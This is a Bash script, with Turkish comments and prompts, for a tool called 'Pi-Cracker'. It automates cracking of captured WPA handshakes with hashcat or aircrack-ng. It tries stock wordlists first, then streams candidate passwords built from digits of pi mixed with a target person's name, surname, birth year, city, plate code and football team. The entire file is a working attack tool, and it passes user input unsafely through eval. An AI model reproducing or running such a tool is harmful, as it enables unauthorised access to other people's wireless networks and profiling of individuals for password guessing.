#!/bin/bash

# ==============================================================================
# Pi-BruteForce: Akıllı Hibrit WiFi Kırıcı (Unified)
#
# Bu script, sistemdeki araçları (GPU/CPU, Hashcat/Aircrack) analiz ederek
# en uygun saldırı yöntemini otomatik seçer veya kullanıcıya sunar.
# Pi sayısının basamaklarını ve kişisel bilgileri (OSINT) kullanarak saldırır.
# ==============================================================================

# --- Renk Tanımları ---
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# --- Sabitler ve Yollar ---
C_PROGRAM="./pi_generator_dynamic"
WORDLIST_DIR="../Wordlist"
CAPTURE_DIR="../Handshake/captures"
SESSION_NAME="pi_hybrid_session"
STATE_FILE="pi_generator.state"
TEMP_WORDLIST="pi_wordlist.tmp"

# --- Fonksiyonlar ---

check_dependencies() {
    echo -e "${BLUE}[*] Sistem bağımlılıkları kontrol ediliyor...${NC}"
    
    # C Programı Kontrolü
    if [ ! -x "$C_PROGRAM" ]; then
        echo -e "${YELLOW}[!] C programı derlenmemiş. Derleniyor...${NC}"
        gcc pi_generator_dynamic.c -o pi_generator_dynamic -lmpfr -lgmp
        if [ $? -ne 0 ]; then
            echo -e "${RED}[HATA] Derleme başarısız! 'libmpfr-dev' ve 'libgmp-dev' yüklü mü?${NC}"
            exit 1
        fi
        echo -e "${GREEN}[OK] C programı hazır.${NC}"
    fi

    # Araç Kontrolleri
    has_hashcat=false
    has_aircrack=false
    has_converter=false
    has_gpu=false

    if command -v hashcat &> /dev/null; then has_hashcat=true; fi
    if command -v aircrack-ng &> /dev/null; then has_aircrack=true; fi
    if command -v hcxpcapngtool &> /dev/null; then has_converter=true; fi
    
    # Basit GPU kontrolü (nvidia-smi veya lspci)
    if command -v nvidia-smi &> /dev/null || lspci | grep -i "vga" | grep -i "nvidia" &> /dev/null;
        then
        has_gpu=true
    fi
}

select_attack_mode() {
    echo -e "\n${CYAN}--- Saldırı Modu Seçimi ---${NC}"
    
    mode="none"
    
    # Otomatik Öneri
    if [ "$has_hashcat" = true ]; then
        if [ "$has_gpu" = true ]; then
            echo -e "Sistemde ${GREEN}GPU${NC} ve ${GREEN}Hashcat${NC} tespit edildi. (En Hızlı Yöntem)"
            recommended="hashcat"
        else
            echo -e "Sistemde ${GREEN}Hashcat${NC} var ama güçlü bir GPU algılanamadı."
            recommended="hashcat"
        fi
    elif [ "$has_aircrack" = true ]; then
        echo -e "Sistemde sadece ${YELLOW}Aircrack-ng${NC} tespit edildi. (Daha Yavaş)"
        recommended="aircrack"
    else
        echo -e "${RED}[HATA] Ne Hashcat ne de Aircrack-ng bulundu! Lütfen birini yükleyin.${NC}"
        exit 1
    fi

    echo -e "\n1) Hashcat (Önerilen - GPU/CPU)"
    echo "2) Aircrack-ng (CPU)"
    read -p "Seçiminiz [Enter=Otomatik ($recommended)]: " user_choice
    
    if [ "$user_choice" == "1" ]; then mode="hashcat"; 
    elif [ "$user_choice" == "2" ]; then mode="aircrack";
    else mode="$recommended"; fi

    # Seçim Doğrulama
    if [ "$mode" == "hashcat" ] && [ "$has_hashcat" = false ]; then
        echo -e "${RED}[HATA] Hashcat seçildi ama sistemde yüklü değil! Aircrack'e geçiliyor...${NC}"
        mode="aircrack"
    fi
    
    if [ "$mode" == "aircrack" ] && [ "$has_aircrack" = false ]; then
         echo -e "${RED}[HATA] Aircrack seçildi ama sistemde yüklü değil!${NC}"
         exit 1
    fi
    
    echo -e "${GREEN}[+] Seçilen Mod: $mode${NC}"
}

get_target_file() {
    echo -e "\n${CYAN}--- Hedef Dosya Seçimi ---${NC}"
    echo -e "${YELLOW}İpucu: Dosyaya sağ tıklayıp yolunu kopyalayabilirsiniz.${NC}"
    echo -e "Varsayılan Arama Yolu: $CAPTURE_DIR"
    
    while true;
        do
        read -p "Handshake Dosyası (.cap / .hc22000): " input_file
        input_file=$(eval echo $input_file) # Tilde expansion

        if [ -z "$input_file" ]; then continue; fi

        if [ ! -f "$input_file" ]; then
            echo -e "${RED}[HATA] Dosya bulunamadı: $input_file${NC}"
            continue
        fi
        
        # Dosya türü ve dönüşüm kontrolü
        filename=$(basename -- "$input_file")
        extension="${filename##*.}"
        
        target_file="$input_file"
        
        if [ "$mode" == "hashcat" ]; then
            if [[ "$extension" == "cap" ]]; then
                # .cap -> .hc22000 dönüşümü gerekli
                hc_path="${CAPTURE_DIR}/hc22000/${filename%.*}.hc22000"
                
                if [ -f "$hc_path" ]; then
                    echo -e "${GREEN}[OK] Otomatik olarak dönüştürülmüş dosya bulundu: $hc_path${NC}"
                    target_file="$hc_path"
                elif [ "$has_converter" = true ]; then
                    echo -e "${YELLOW}[!] .cap dosyası dönüştürülüyor (hcxpcapngtool)...${NC}"
                    mkdir -p "${CAPTURE_DIR}/hc22000"
                    hcxpcapngtool -o "$hc_path" "$input_file"
                    if [ $? -eq 0 ]; then
                        echo -e "${GREEN}[OK] Dönüşüm başarılı.${NC}"
                        target_file="$hc_path"
                    else
                        echo -e "${RED}[HATA] Dönüşüm başarısız! Aircrack moduna geçmek ister misiniz? (E/h)${NC}"
                        read -p "> " switch_ask
                        if [[ "$switch_ask" =~ ^[Hh]$ ]]; then exit 1; fi
                        mode="aircrack"
                        target_file="$input_file"
                    fi
                else
                    echo -e "${RED}[HATA] .cap dosyası Hashcat ile doğrudan kullanılamaz ve 'hcxpcapngtool' bulunamadı.${NC}"
                    echo -e "${YELLOW}Seçenekler:${NC}"
                    echo "1) Dosyayı online dönüştürüp .hc22000 yolunu gösterin"
                    echo "2) Aircrack-ng moduna geçin"
                    read -p "Seçim (1/2): " conv_choice
                    if [ "$conv_choice" == "2" ]; then 
                        mode="aircrack"
                        target_file="$input_file"
                    else
                        continue
                    fi
                fi
            fi
        fi
        
        break
    done
    echo -e "${GREEN}[+] Hedef Dosya: $target_file${NC}"
}

get_user_info() {
    echo -e "\n${BLUE}--- Hedef Kişi Bilgileri (Akıllı Wordlist İçin) ---${NC}"
    echo -e "${YELLOW}(Bilmiyorsanız boş geçip Enter'a basın)${NC}"

    read -p "Adı (Örn: Ahmet): " target_name
    read -p "Soyadı (Örn: Yilmaz): " target_surname
    read -p "Doğum Yılı (Örn: 1990): " target_year
    read -p "Şehir (Örn: Istanbul): " target_city
    read -p "Plaka Kodu (Örn: 34): " target_plate

    echo -e "\n${BLUE}--- Takım Bilgisi ---${NC}"
    echo "1) Galatasaray (GS)"
    echo "2) Fenerbahçe (FB)"
    echo "3) Beşiktaş (BJK)"
    echo "4) Trabzonspor (TS)"
    echo "5) Diğer / Bilinmiyor"
    read -p "Seçiminiz (1-5): " team_choice

    case $team_choice in
        1) target_team="gs" ;; 
        2) target_team="fb" ;; 
        3) target_team="bjk" ;; 
        4) target_team="ts" ;; 
        *) target_team="" ;; 
    esac
    
    # Parametreleri hazırla
    ARGS="--name \"$target_name\" --surname \"$target_surname\" --year \"$target_year\" --city \"$target_city\" --plate \"$target_plate\" --team \"$target_team\""
}

run_attack() {
    echo -e "\n${BLUE}--- Saldırı Parametreleri ---${NC}"
    read -p "Şifre Uzunluğu [8]: " pass_len
    pass_len=${pass_len:-8}

    read -p "Döngü Başına Deneme Sayısı [10000000]: " num_pass
    num_pass=${num_pass:-10000000}

    echo -e "\n${GREEN}[+] SALDIRI BAŞLATILIYOR...${NC}"
    echo "---------------------------------------------------"
    echo -e "Mod            : $mode"
    echo -e "Hedef Dosya    : $target_file"
    echo "---------------------------------------------------"
    sleep 2

    # --- FAZ 0: Hazır Wordlistler ---
    echo -e "\n${CYAN}===== FAZ 0: HAZIR WORDLISTLER DENENİYOR =====${NC}"
    for wordlist in "$WORDLIST_DIR"/probable-v2-wpa-top*.txt;
        do
        if [ -f "$wordlist" ]; then
            echo -e "${YELLOW}[*] Wordlist: $(basename $wordlist)${NC}"
            
            if [ "$mode" == "hashcat" ]; then
                hashcat -m 22000 -a 0 "$target_file" "$wordlist" --session "$SESSION_NAME" --status
                if [ $? -eq 0 ]; then
                    echo -e "\n${GREEN}[!!!] ŞİFRE BULUNDU (Hashcat)${NC}"; hashcat -m 22000 -a 0 "$target_file" --show; exit 0
                fi
            else
                aircrack-ng -w "$wordlist" "$target_file" -l "bulunan_sifre.txt"
                if [ $? -eq 0 ] && [ -f "bulunan_sifre.txt" ]; then
                     echo -e "\n${GREEN}[!!!] ŞİFRE BULUNDU (Aircrack)${NC}"; cat "bulunan_sifre.txt"; exit 0
                fi
            fi
        fi
    done

    # --- FAZ 1: Dinamik Saldırı ---
    cycle_count=1
    while true;
        do
        echo -e "\n${CYAN}===== DÖNGÜ #$cycle_count (Pi Dinamik) =====${NC}"
        
        # State oku
        current_offset=0
        if [ -f "$STATE_FILE" ]; then current_offset=$(cat "$STATE_FILE"); fi
        echo -e "${BLUE}[*] Pi Basamağı: $current_offset${NC}"

        if [ "$mode" == "hashcat" ]; then
            # HASHCAT: Pipeline ile besleme (Disk G/Ç yok, Çok Hızlı)
            cmd="$C_PROGRAM $pass_len $num_pass /dev/stdout $ARGS | hashcat -m 22000 -a 0 \"$target_file\" --session \"$SESSION_NAME\" --status"
            eval "$cmd"
            hc_ret=$?
            if [ $hc_ret -eq 0 ]; then
                echo -e "\n${GREEN}[!!!] ŞİFRE BULUNDU${NC}"; hashcat -m 22000 -a 0 "$target_file" --show; exit 0
            elif [ $hc_ret -ne 1 ]; then
                 echo -e "${RED}[HATA] Hashcat hatası (Kod: $hc_ret)${NC}"; exit 1
            fi
        else
            # AIRCRACK: Dosyaya yaz ve oku (Yavaş)
            echo -e "[*] Wordlist oluşturuluyor..."
            $C_PROGRAM $pass_len $num_pass "$TEMP_WORDLIST" $ARGS > /dev/null
            
            echo -e "[*] Aircrack-ng çalışıyor..."
            output=$(aircrack-ng -w "$TEMP_WORDLIST" "$target_file")
            
            if echo "$output" | grep -q "KEY FOUND!"; then
                key=$(echo "$output" | grep "KEY FOUND!" | awk '{print $4}')
                echo -e "\n${GREEN}[!!!] ŞİFRE BULUNDU: $key${NC}"
                echo "$key" > bulunan_sifre.txt
                exit 0
            fi
            rm -f "$TEMP_WORDLIST"
        fi
        
        cycle_count=$((cycle_count + 1))
    done
}

# --- Ana Akış ---
clear
echo -e "${CYAN}***********************************************${NC}"
echo -e "${CYAN}*          Pi-Cracker v1.0 (Unified)          *${NC}"
echo -e "${CYAN}***********************************************${NC}"
check_dependencies
select_attack_mode
get_target_file
get_user_info
run_attack
